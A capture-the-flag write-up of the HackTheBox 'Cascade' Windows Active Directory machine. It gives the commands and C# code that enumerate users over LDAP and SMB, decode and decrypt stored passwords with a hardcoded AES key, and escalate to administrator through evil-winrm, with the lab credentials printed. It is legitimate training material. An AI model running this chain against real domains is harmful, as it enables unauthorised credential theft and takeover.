---
title: Write-up Cascade Machine
author: pcw3r
date: 2020-07-25 15:00:00 +0000
categories: [HackTheBox, Pentest]
tags: [WINDOWS, MEDIUM, ACTIVE-DIRECTORY EXPLOITATION, ENUMERATION, REVIEW CODE, PASSWORD DECRYPT]
---

**<center>Ref°: HTB-12-Pentest</center>**

![Desktop View]({{ "/assets/img/cascade/HTB-Badge-Cascade.png" | relative_url }})

--- Cascade is a Windows Medium machine which highlights the misconfiguration of the accounts and strength in the use of code review to recover sensitive information.

![Desktop View]({{ "/assets/img/cascade/HTB-Information-Cascade.png" | relative_url }})

## **<span style='color:#c0392b'>Discovery - Figure out environment</span>**
### Network Service Scanning
***
Nmap scan reveal many services on her usual port such as : `kerberos`, `ldap`, `smb`, etc.

```terminal
$ nmap -Pn -T5 10.10.10.182 -p-
```

![Desktop View]({{ "/assets/img/cascade/HTB-Images-Cascade-nmap.png" | relative_url }})

### Server Message Block
***
My first reaction is to use enum4linux to hope find many users and the domain to pwned.

```terminal
$ enum4linux 10.10.10.182
```
And we got all of this : `Administrator, krbtgt, e.crowe, b.hanson, i.croft, CascGuest, arksvc, s.smith, r.thompson, util, j.wakefield, s.hickson, j.goodhand, a.turnbull, d.burman, BackupSvc, j.allen`

![Desktop View]({{ "/assets/img/cascade/HTB-Images-Cascade-enum4linux.png" | relative_url }})

We can also use rpcclient to find the same thing.

```terminal
$ rpcclient -U "" 10.10.10.182
rpcclient $> enumdomusers
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
```

smb and kerberos services reveal nothing.

### Lightweight Directory Access Protocol
***
We use ldapsearch tool to find other information through ldap service.

```terminal
$ ldapsearch -x -h 10.10.10.182 -p 389 -b "dc=cascade,dc=local" > ldapsearch.txt
```

## **<span style='color:#c0392b'>Foothold - Get into the target </span>**
### Encoded Password from attribute
***

To perform the enumeration, we grep all information reference by `password`, `passwd`, or `pwd`.
Here we find interesting attribute with name `cascadeLegacyPwd` from the user `r.thompson`.

`clk0bjVldmE=` he seem to be her hash password encode in base 64?

```terminal
$ grep "Pwd" ldapsearch.txt
```

![Desktop View]({{ "/assets/img/cascade/HTB-Images-Cascade-attribute.png" | relative_url }})


### Decoding Password
***

No vulnerabilities identify here, but we have possibility to decrypt hash password of the user `r.thompson`. 
We can exploit this to access and gain a foothold.

We create file which contain the hash password and use this command to decrypt:

```terminal
$ command base64 -d passwd.txt
```

![Desktop View]({{ "/assets/img/cascade/HTB-Images-Cascade-decode.png" | relative_url }})

We found the password : `rY4n5eva`

### Remote Service SMB login
***
We can use this credential to access of the target through smb service.

```terminal
$ smbmap -u r.thompson -p rY4n5eva -H 10.10.10.182
```

smbmap tool reveal more available share with this account, but the more interesting is `Data` share.

![Desktop View]({{ "/assets/img/cascade/HTB-Images-Cascade-share_data.png" | relative_url }})

## **<span style='color:#c0392b'>Lateral Movement - Move through environment</span>**
### Encrypted Password from .reg file
***

Enumeration of Data Share :

```terminal
$ mount -t cifs //10.10.10.182/Data share_data -o username='r.thompson',password=rY4n5eva
```

Under `/IT/Email Archives/`, we have `Meeting_Notes_June_2018.html`.

![Desktop View]({{ "/assets/img/cascade/HTB-Images-Cascade-archive_mail.png" | relative_url }})

This email archive reveal about temporary account which used to perform all tasks related to the network migration and this account has been deleted. The username was `TempAdmin` and the password is the same of the normal admin account.

Under `/IT/Logs/Ark AD Recycle Bin/`, we have `ArkAdRecycleBin;Log`.
This file show us two things :
* We have execution of program by `ArkSvc`
* TempAdmin account has been moved to AD recycle bin

![Desktop View]({{ "/assets/img/cascade/HTB-Images-Cascade-log.png" | relative_url }})

Under `/IT/Temp/s.smith/`, we have `VNC Install.reg`.
This file contain password in hex format ...

![Desktop View]({{ "/assets/img/cascade/HTB-Images-Cascade-vnc_reg.png" | relative_url }})

### Decrypting Password
***

I find tool to decrypt vnc password in hex format.

Reference - vncpasswd tool : <https://github.com/trinitronx/vncpasswd.py>

```terminal
$ python2 vncpasswd.py -d -H 6bcf2a4b6e5aca0f
```

We found password : `sT333ve2`

![Desktop View]({{ "/assets/img/cascade/HTB-Images-Cascade-vnc_decode.png" | relative_url }})

### Remote Service WinRM login
***
We have now the possibility to connect through evil-winrm and grab the flag user.

```terminal
$ evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2
```

### Flag user
***

![Desktop View]({{ "/assets/img/cascade/HTB-Images-Cascade-flag_user.png" | relative_url }})

## **<span style='color:#c0392b'>Lateral Movement - Move through environment 2</span>**
### Remote Service SMB login
***
smbmap tool reveal more available share with this new account, but the more interesting is `audit$` share.

```terminal
smbmap -u s.smith -p sT333ve2 -H 10.10.10.182
```

```terminal
$ mount -t cifs //10.10.10.182/audit$ share_audit -o username='s.smith',password=sT333ve2
```

Under `/audit/DB/`, we have `Audit.db`.

Under `/audit/`, we have `CascAudit.exe` and many `.dll` files.

### Encrypted Password from database
***
We found inside `ldap` table encrypt password of arksvc account : `BQO5l5Kj9MdErXx6Q6AGOw==`

![Desktop View]({{ "/assets/img/cascade/HTB-Images-Cascade-DB.png" | relative_url }})


#### Review Code CascAudit.exe :
We use ILSpy tool to decompile the program CascAudit.exe and we have the key used for the encryption and decryption of arksvc account password : `c4scadek3y654321`

![Desktop View]({{ "/assets/img/cascade/HTB-Images-Cascade-ilspy_program.png" | relative_url }})

But we need to recover the complete function of decryption to discover the password.

This function is present in `CascCrypto.dll`.

![Desktop View]({{ "/assets/img/cascade/HTB-Images-Cascade-ilspy_function.png" | relative_url }})


What we learn here is that to encrypt a string, we use the following :

* Key = `c4scadek3y654321`
* initVector = `1tdyjCbY1Ix49842`
* keySize = `128`

So we have the possiblity to decrypt the hash from function DecryptString.

```shell
	public static string DecryptString(string EncryptedString, string Key)
	{
		//Discarded unreachable code: IL_009e
		byte[] array = Convert.FromBase64String(EncryptedString);
		Aes aes = Aes.Create();
		aes.KeySize = 128;
		aes.BlockSize = 128;
		aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
		aes.Mode = CipherMode.CBC;
		aes.Key = Encoding.UTF8.GetBytes(Key);
		using (MemoryStream stream = new MemoryStream(array))
		{
			using (CryptoStream cryptoStream = new CryptoStream(stream, aes.CreateDecryptor(), CryptoStreamMode.Read))
			{
				byte[] array2 = new byte[checked(array.Length - 1 + 1)];
				cryptoStream.Read(array2, 0, array2.Length);
				return Encoding.UTF8.GetString(array2);
			}
		}
	}
```
### Decrypting Password
***
We create a new cs project with visual-studio and insert only the functions we need.

**Utils.cs :**

```shell
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class Crypto
{
	public const string DefaultIV = "1tdyjCbY1Ix49842";

	public const int Keysize = 128;

	public static string EncryptString(string Plaintext, string Key)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(Plaintext);
		Aes aes = Aes.Create();
		aes.BlockSize = 128;
		aes.KeySize = 128;
		aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
		aes.Key = Encoding.UTF8.GetBytes(Key);
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytes, 0, bytes.Length);
				cryptoStream.FlushFinalBlock();
			}
			return Convert.ToBase64String(memoryStream.ToArray());
		}
	}

	public static string DecryptString(string EncryptedString, string Key)
	{
		//Discarded unreachable code: IL_009e
		byte[] array = Convert.FromBase64String(EncryptedString);
		Aes aes = Aes.Create();
		aes.KeySize = 128;
		aes.BlockSize = 128;
		aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
		aes.Mode = CipherMode.CBC;
		aes.Key = Encoding.UTF8.GetBytes(Key);
		using (MemoryStream stream = new MemoryStream(array))
		{
			using (CryptoStream cryptoStream = new CryptoStream(stream, aes.CreateDecryptor(), CryptoStreamMode.Read))
			{
				byte[] array2 = new byte[checked(array.Length - 1 + 1)];
				cryptoStream.Read(array2, 0, array2.Length);
				return Encoding.UTF8.GetString(array2);
			}
		}
	}
}
```

**Program.cs :** We pass the hash value like EncryptedString and the key to call the function DecryptString and result in console the plaintext password.

```shell
﻿using System;

namespace Cascade_Decrypt_Password_arksvc
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine(Crypto.DecryptString("BQO5l5Kj9MdErXx6Q6AGOw==", "c4scadek3y654321"));
        }
    }
}
```

The password decrypted : `w3lc0meFr31nd`

![Desktop View]({{ "/assets/img/cascade/HTB-Images-Cascade-decrypt.png" | relative_url }})

### Remote Service WinRM login
***

```terminal
$ evil-winrm -i 10.10.10.182 -u arksvc -p w3lc0meFr31nd
```

## **<span style='color:#c0392b'>Privilege Escalation - Gain higher-level permissions</span>**
### AdminTemp Exploitation from Recycle-Bin
***
We identified ArkSvc account was being used to move the TempAdmin account to the recycle bin.

TempAdmin for Reminder has the same password as the administrator.

### Encoded Password from attribute
***
Let's take a look at the properties of this account.

```terminal
PS c:\Users\arksvc\Documents> get-addomain | select DeletedObjectsContainer
PS c:\Users\arksvc\Documents> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *
```
![Desktop View]({{ "/assets/img/cascade/HTB-Images-Cascade-bin.png" | relative_url }})

![Desktop View]({{ "/assets/img/cascade/HTB-Images-Cascade-bin2.png" | relative_url }})

We have the same attribute under AdminTemp `cascadeLegacyPwd` and we grab the hash password in base64 : `YmFDVDNyMWFOMDBkbGVz`

### Decoding Password
***

```terminal
$ command base64 -d passwd2.txt
```

We found the password : `baCT3r1aN00dles`

![Desktop View]({{ "/assets/img/cascade/HTB-Images-Cascade-decode2.png" | relative_url }})



### Remote Service WinRM login and Flag root
***
We get full control of Cascade machine.

```terminal
$ evil-winrm -i 10.10.10.182 -u administrator -p baCT3r1aN00dles
```

![Desktop View]({{ "/assets/img/cascade/HTB-Images-Cascade-flag_root.png" | relative_url }})

***

## **<center>Trophy</center>**

> **Your most unhappy customers are your greatest source of learning.**
>
> Bill Gates
